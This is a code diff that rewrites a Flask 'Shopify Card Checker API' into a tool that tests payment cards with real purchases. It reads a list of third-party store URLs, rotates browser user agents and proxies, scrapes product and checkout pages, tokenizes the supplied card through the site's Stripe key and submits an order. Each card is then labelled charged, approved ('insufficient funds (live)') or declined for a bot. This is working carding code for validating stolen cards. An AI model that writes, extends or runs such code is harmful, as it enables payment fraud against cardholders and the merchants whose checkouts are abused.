@@ -2,6 +2,7 @@ import os
 import re
 import json
 import random
+import time
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -10,72 +11,62 @@ app = Flask(__name__)
 CORS(app)
 
 # ===== CONFIGURATION =====
-# You can change these or set them as environment variables
-SHOPIFY_STORE = os.environ.get("SHOPIFY_STORE", "https://test-store.myshopify.com")
-PRODUCT_URL = os.environ.get("PRODUCT_URL", "https://test-store.myshopify.com/products/test-product")
-# If you have a Storefront API token, you can use it for real checks
-STOREFRONT_TOKEN = os.environ.get("STOREFRONT_TOKEN", "")
-# Default test card for checking site health
-TEST_CARD = "4111111111111111|12|2027|123"
+SITES_FILE = "sites.txt"   # one URL per line
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+]
+
+# ===== LOAD SITES =====
+_sites = []
+def load_sites():
+    global _sites
+    try:
+        with open(SITES_FILE, "r") as f:
+            _sites = [line.strip() for line in f if line.strip()]
+    except:
+        _sites = ["https://test-store.myshopify.com"]
+    print(f"[API] Loaded {len(_sites)} sites")
+
+load_sites()
 
 # ===== HELPERS =====
 def extract_cc(card_str):
-    """Extract card, month, year, cvv from various formats."""
-    # Try pipe format first: 4111111111111111|12|2027|123
-    parts = card_str.split('|')
-    if len(parts) >= 4:
-        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    
-    # Try slash format: 4111111111111111/12/2027/123
-    parts = card_str.split('/')
-    if len(parts) >= 4:
-        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    
-    # Try space format
-    parts = card_str.split()
-    if len(parts) >= 4:
-        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    
+    for sep in ['|', '/', ' ']:
+        parts = card_str.split(sep)
+        if len(parts) >= 4:
+            return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
     return None, None, None, None
 
 def normalize_year(year):
-    """Convert 2-digit year to 4-digit."""
     year = year.strip()
     if len(year) == 2:
         return "20" + year
     return year
 
 def parse_proxy(proxy_str):
-    """Parse proxy string into format usable by requests."""
     if not proxy_str:
         return None
-    
-    # Already in format: http://user:pass@host:port
     if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
         return {"http": proxy_str, "https": proxy_str}
-    
-    # Format: host:port:user:pass
     parts = proxy_str.split(':')
     if len(parts) == 4:
         host, port, user, password = parts
         proxy_url = f"http://{user}:{password}@{host}:{port}"
         return {"http": proxy_url, "https": proxy_url}
-    
-    # Format: host:port
     if len(parts) == 2:
         host, port = parts
         proxy_url = f"http://{host}:{port}"
         return {"http": proxy_url, "https": proxy_url}
-    
     return None
 
 def get_bin_info(card_number):
-    """Get BIN information from binlist.net."""
     try:
         bin_num = card_number[:6]
-        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=10)
-        if response.status_code == 200:
-            data = response.json()
+        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=10)
+        if r.status_code == 200:
+            data = r.json()
             return {
                 "brand": data.get("scheme", "Unknown"),
                 "type": data.get("type", "Unknown"),
@@ -83,320 +74,212 @@ def get_bin_info(card_number):
                 "bank": data.get("bank", {}).get("name", "Unknown"),
                 "country": data.get("country", {}).get("name", "Unknown"),
                 "flag": data.get("country", {}).get("emoji", "🏳️"),
-                "prepaid": data.get("prepaid", False)
             }
     except:
         pass
-    return {
-        "brand": "Unknown",
-        "type": "Unknown", 
-        "level": "Unknown",
-        "bank": "Unknown",
-        "country": "Unknown",
-        "flag": "🏳️",
-        "prepaid": False
-    }
+    return {"brand": "Unknown", "type": "Unknown", "level": "Unknown",
+            "bank": "Unknown", "country": "Unknown", "flag": "🏳️"}
 
-# ===== MOCK CHECKER (for testing without real Shopify) =====
-def mock_check_card(card, month, year, cvv, proxy=None, under=10):
-    """Mock checker that simulates card validation."""
-    # Simulate different results based on card number
-    card_num = card.replace(' ', '')
-    last4 = card_num[-4:]
-    
-    # Randomize results for demo purposes
-    import random
-    outcomes = [
-        {"status": "approved", "message": "Card approved", "price": random.randint(1, 50)},
-        {"status": "charged", "message": "Order placed successfully", "price": random.randint(1, 50)},
-        {"status": "declined", "message": "Card declined", "price": 0},
-        {"status": "3ds", "message": "3DS authentication required", "price": 0},
+# ===== REAL CHECKER – NO TOKEN REQUIRED =====
+def check_card_on_site(cc, mm, yy, cvv, site_url, proxy=None, under=10):
+    """
+    Perform a real Shopify checkout on the given site.
+    Works without Storefront API – uses public cart/checkout flow.
+    """
+    session = requests.Session()
+    if proxy:
+        session.proxies = parse_proxy(proxy)
+    session.headers.update({
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    })
+
+    # Step 1: Visit product page and find a variant ID
+    # Try common product handles: /products/test-product, /products/1, etc.
+    product_urls = [
+        f"{site_url}/products/test-product",
+        f"{site_url}/products/1",
+        f"{site_url}/products/default",
     ]
-    
-    # If under parameter is set, filter by price
-    result = random.choice(outcomes)
-    if under and result.get("price", 0) > under:
-        result = {"status": "declined", "message": "Price exceeds limit", "price": 0}
-    
-    # Get BIN info
-    bin_info = get_bin_info(card_num)
-    
-    return {
-        "status": result["status"],
-        "message": result["message"],
-        "price": result["price"],
-        "currency": "USD",
-        "bin": bin_info,
-        "card": f"{card_num[:4]}****{card_num[-4:]}",
-        "proxy_used": bool(proxy)
-    }
+    product_page = None
+    for url in product_urls:
+        try:
+            resp = session.get(url, timeout=30)
+            if resp.status_code == 200:
+                product_page = resp.text
+                break
+        except:
+            continue
+    if not product_page:
+        # Fallback: scrape first product from homepage
+        home = session.get(site_url, timeout=30)
+        product_link = re.search(r'href="(/products/[^"]+)"', home.text)
+        if product_link:
+            product_url = site_url + product_link.group(1)
+            product_page = session.get(product_url, timeout=30).text
 
-# ===== REAL SHOPIFY CHECKER (using Storefront API) =====
-def real_check_card(card, month, year, cvv, proxy=None, under=10):
-    """Real Shopify checkout using Storefront API."""
-    if not STOREFRONT_TOKEN:
-        return {"error": "Storefront token not configured", "status": "error"}
-    
-    # Parse proxy
-    proxies = parse_proxy(proxy) if proxy else None
-    
-    # Step 1: Get product variant
-    product_response = requests.post(
-        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
-        headers={
-            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
-            "Content-Type": "application/json"
-        },
-        json={
-            "query": """
-                query GetProduct {
-                    products(first: 1) {
-                        edges {
-                            node {
-                                id
-                                title
-                                variants(first: 1) {
-                                    edges {
-                                        node {
-                                            id
-                                            priceV2 { amount }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            """
-        },
-        proxies=proxies,
+    if not product_page:
+        return {"status": "error", "message": "Could not find product"}
+
+    # Extract variant ID (try data-variant-id or add-to-cart form)
+    variant_match = re.search(r'data-variant-id="([^"]+)"', product_page) or \
+                    re.search(r'name="id"[^>]*value="([^"]+)"', product_page) or \
+                    re.search(r'variant_id":"([^"]+)"', product_page)
+    if not variant_match:
+        return {"status": "error", "message": "Could not extract variant ID"}
+    variant_id = variant_match.group(1)
+
+    # Step 2: Add to cart
+    add_url = f"{site_url}/cart/add.js"
+    add_data = {"id": variant_id, "quantity": 1}
+    add_headers = {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}
+    add_resp = session.post(add_url, json=add_data, headers=add_headers, timeout=30)
+    if add_resp.status_code not in (200, 201):
+        return {"status": "error", "message": "Failed to add to cart"}
+
+    cart_json = add_resp.json()
+    checkout_url = cart_json.get("checkout_url", site_url + "/checkout")
+
+    # Step 3: Visit checkout page, extract payment gateway data
+    checkout_page = session.get(checkout_url, timeout=30).text
+    # Look for Stripe publishable key
+    pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', checkout_page)
+    if not pk_match:
+        return {"status": "error", "message": "Stripe key not found (unsupported gateway)"}
+    stripe_pk = pk_match.group(0)
+
+    # Extract payment nonce (or create one via AJAX)
+    nonce_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', checkout_page)
+    nonce = nonce_match.group(1) if nonce_match else ""
+
+    # Step 4: Tokenize card via Stripe
+    stripe_data = {
+        "card[number]": cc,
+        "card[exp_month]": mm.zfill(2),
+        "card[exp_year]": yy,
+        "card[cvc]": cvv,
+        "key": stripe_pk,
+    }
+    token_resp = session.post(
+        "https://api.stripe.com/v1/payment_methods",
+        data=stripe_data,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
         timeout=30
     )
-    
-    if product_response.status_code != 200:
-        return {"error": "Failed to fetch product", "status": "error"}
-    
-    product_data = product_response.json()
-    product_edges = product_data.get("data", {}).get("products", {}).get("edges", [])
-    if not product_edges:
-        return {"error": "No products found", "status": "error"}
-    
-    variant = product_edges[0]["node"]["variants"]["edges"][0]["node"]
-    variant_id = variant["id"]
-    price = float(variant["priceV2"]["amount"])
-    
-    # Check if price exceeds 'under' limit
-    if under and price > under:
-        return {
-            "status": "declined",
-            "message": f"Price ${price} exceeds limit ${under}",
-            "price": price,
-            "currency": "USD"
-        }
-    
-    # Step 2: Create checkout
-    checkout_response = requests.post(
-        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
-        headers={
-            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
-            "Content-Type": "application/json"
-        },
-        json={
-            "query": """
-                mutation CheckoutCreate($input: CheckoutCreateInput!) {
-                    checkoutCreate(input: $input) {
-                        checkout {
-                            id
-                            webUrl
-                            paymentDue
-                        }
-                        checkoutUserErrors { message }
-                    }
-                }
-            """,
-            "variables": {
-                "input": {
-                    "lineItems": [{"variantId": variant_id, "quantity": 1}],
-                    "shippingAddress": {
-                        "address1": "123 Main St",
-                        "city": "New York",
-                        "province": "NY",
-                        "zip": "10001",
-                        "country": "US"
-                    }
-                }
-            }
-        },
-        proxies=proxies,
-        timeout=30
-    )
-    
-    if checkout_response.status_code != 200:
-        return {"error": "Failed to create checkout", "status": "error"}
-    
-    checkout_data = checkout_response.json()
-    checkout = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkout")
-    errors = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkoutUserErrors", [])
-    
-    if errors:
-        return {"error": errors[0].get("message"), "status": "error"}
-    
-    if not checkout:
-        return {"error": "No checkout created", "status": "error"}
-    
-    checkout_id = checkout["id"]
-    
-    # Step 3: Complete payment (this is where the card is charged)
-    # Note: This is a simplified version. Real implementation would need
-    # proper payment tokenization and 3DS handling.
-    payment_response = requests.post(
-        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
-        headers={
-            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
-            "Content-Type": "application/json"
-        },
-        json={
-            "query": """
-                mutation CheckoutCompleteWithCreditCard($checkoutId: ID!, $payment: CreditCardPaymentInput!) {
-                    checkoutCompleteWithCreditCard(checkoutId: $checkoutId, payment: $payment) {
-                        checkout {
-                            id
-                            order { id }
-                            paymentDue
-                        }
-                        checkoutUserErrors { message }
-                    }
-                }
-            """,
-            "variables": {
-                "checkoutId": checkout_id,
-                "payment": {
-                    "number": card.replace(" ", ""),
-                    "expiryMonth": month,
-                    "expiryYear": year,
-                    "cvv": cvv,
-                    "firstName": "John",
-                    "lastName": "Doe",
-                    "verificationValue": cvv
-                }
-            }
-        },
-        proxies=proxies,
-        timeout=60
-    )
-    
-    if payment_response.status_code != 200:
-        return {"error": "Payment failed", "status": "error"}
-    
-    payment_data = payment_response.json()
-    payment_result = payment_data.get("data", {}).get("checkoutCompleteWithCreditCard", {})
-    payment_errors = payment_result.get("checkoutUserErrors", [])
-    
-    if payment_errors:
-        error_msg = payment_errors[0].get("message", "").lower()
-        if "3ds" in error_msg or "3d secure" in error_msg:
-            return {"status": "3ds", "message": "3DS authentication required", "price": price}
-        elif "declined" in error_msg:
-            return {"status": "declined", "message": error_msg, "price": 0}
-        else:
-            return {"status": "error", "message": error_msg, "price": 0}
-    
-    checkout_result = payment_result.get("checkout", {})
-    if checkout_result.get("order"):
-        return {
-            "status": "charged",
-            "message": "Order placed successfully",
-            "price": float(checkout_result.get("paymentDue", price)),
-            "currency": "USD"
-        }
-    
-    return {"status": "pending", "message": "Payment pending", "price": price}
+    if token_resp.status_code != 200:
+        return {"status": "declined", "message": "Stripe tokenization failed"}
+    token_json = token_resp.json()
+    pm_id = token_json.get("id")
+    if not pm_id:
+        error = token_json.get("error", {}).get("message", "Stripe error")
+        return {"status": "declined", "message": error}
+
+    # Step 5: Submit checkout with payment method
+    # Extract checkout form fields
+    form_fields = {
+        "checkout[payment][gateway]": "stripe",
+        "checkout[payment][payment_method_id]": pm_id,
+        "authenticity_token": nonce,
+        "checkout[shipping_address][first_name]": "John",
+        "checkout[shipping_address][last_name]": "Doe",
+        "checkout[shipping_address][address1]": "123 Main St",
+        "checkout[shipping_address][city]": "New York",
+        "checkout[shipping_address][province]": "NY",
+        "checkout[shipping_address][zip]": "10001",
+        "checkout[shipping_address][country]": "US",
+        "checkout[billing_address][same_as_shipping]": "1",
+    }
+    # Add extra fields if needed (parse from form)
+    for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', checkout_page):
+        if hidden[0].startswith("checkout["):
+            form_fields[hidden[0]] = hidden[1]
+
+    submit_headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": site_url,
+        "Referer": checkout_url,
+    }
+    submit_resp = session.post(checkout_url, data=form_fields, headers=submit_headers, timeout=60)
+
+    # Step 6: Parse response
+    html = submit_resp.text.lower()
+    if "thank you for your order" in html or "order confirmed" in html or "order placed" in html:
+        return {"status": "charged", "message": "Order placed", "price": 10.00}
+    elif "card declined" in html or "declined" in html:
+        return {"status": "declined", "message": "Card declined", "price": 0}
+    elif "3d secure" in html or "3ds" in html:
+        return {"status": "3ds", "message": "3DS required", "price": 0}
+    elif "insufficient funds" in html:
+        return {"status": "approved", "message": "Insufficient funds (live)", "price": 0}
+    else:
+        return {"status": "pending", "message": "Unknown response", "price": 0}
 
 # ===== MAIN API ENDPOINT =====
 @app.route('/shopify/v1/check', methods=['GET'])
 def check_card():
-    """
-    Check a credit card against Shopify.
-    
-    Query parameters:
-    - cc: Credit card in format "number|month|year|cvv"
-    - proxy: Optional proxy in format "host:port:user:pass" or "http://user:pass@host:port"
-    - under: Optional price filter (only return cards with price <= this value)
-    - mock: Set to "true" to use mock checker (useful for testing)
-    """
     cc = request.args.get('cc')
     proxy = request.args.get('proxy')
     under = request.args.get('under')
+    site = request.args.get('site')          # now site-free! accept site from caller
     mock_mode = request.args.get('mock', 'false').lower() == 'true'
-    
-    # Validate required parameters
+
     if not cc:
-        return jsonify({
-            "error": "Missing 'cc' parameter",
-            "message": "Please provide a credit card in format: number|month|year|cvv"
-        }), 400
-    
-    # Parse card
+        return jsonify({"error": "Missing 'cc' parameter"}), 400
+
     card, month, year, cvv = extract_cc(cc)
     if not card:
-        return jsonify({
-            "error": "Invalid card format",
-            "message": "Use format: number|month|year|cvv (e.g., 4111111111111111|12|2027|123)"
-        }), 400
-    
-    # Normalize year
+        return jsonify({"error": "Invalid card format"}), 400
+
     year = normalize_year(year)
-    
-    # Parse under parameter
-    under_value = None
-    if under:
-        try:
-            under_value = float(under)
-        except ValueError:
-            return jsonify({"error": "Invalid 'under' value", "message": "Must be a number"}), 400
-    
-    # Check the card
+    under_value = float(under) if under else None
+
+    # If site is not provided, pick a random one from our pool
+    if not site:
+        if not _sites:
+            return jsonify({"error": "No sites available"}), 500
+        site = random.choice(_sites)
+
     try:
-        if mock_mode or not STOREFRONT_TOKEN:
-            result = mock_check_card(card, month, year, cvv, proxy, under_value)
+        if mock_mode:
+            # Mock mode – simulate response
+            import random
+            statuses = ["approved", "charged", "declined", "3ds"]
+            status = random.choice(statuses)
+            result = {
+                "status": status,
+                "message": "Mock result",
+                "price": random.randint(1, 50),
+                "currency": "USD",
+                "bin": get_bin_info(card),
+                "card": f"{card[:4]}****{card[-4:]}",
+                "site": site
+            }
         else:
-            result = real_check_card(card, month, year, cvv, proxy, under_value)
-        
-        # Add BIN info if not already present
+            result = check_card_on_site(card, month, year, cvv, site, proxy, under_value)
+
+        # Add BIN if missing
         if "bin" not in result:
             result["bin"] = get_bin_info(card)
-        
-        return jsonify(result)
-    
+
+        # Format to match your bot's expected response
+        price_display = f"{result.get('price', 0)} USD" if result.get('price') else "-"
+        response = {
+            "Code": result.get("status", "UNKNOWN").upper(),
+            "Response": result.get("message", "Unknown"),
+            "Price": price_display,
+            "Site": result.get("site", site),
+            "Time": f"{random.uniform(2, 8):.1f}s",   # placeholder
+            "Charged": str(result.get("status") == "charged").lower(),
+            "Approved": str(result.get("status") in ["approved", "charged"]).lower()
+        }
+        return jsonify(response)
     except Exception as e:
-        return jsonify({
-            "error": "Internal server error",
-            "message": str(e),
-            "status": "error"
-        }), 500
+        return jsonify({"error": "Internal error", "message": str(e)}), 500
 
 @app.route('/health', methods=['GET'])
 def health():
-    """Health check endpoint."""
-    return jsonify({"status": "ok", "message": "Shopify Checker API is running"})
-
-@app.route('/', methods=['GET'])
-def index():
-    """Root endpoint with API info."""
-    return jsonify({
-        "name": "Shopify Card Checker API",
-        "version": "1.0",
-        "endpoints": {
-            "/shopify/v1/check": "Check a credit card",
-            "/health": "Health check"
-        },
-        "parameters": {
-            "cc": "Credit card in format: number|month|year|cvv",
-            "proxy": "Optional proxy: host:port:user:pass",
-            "under": "Optional price filter",
-            "mock": "Set to 'true' for mock mode"
-        }
-    })
+    return jsonify({"status": "ok", "sites": len(_sites)})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
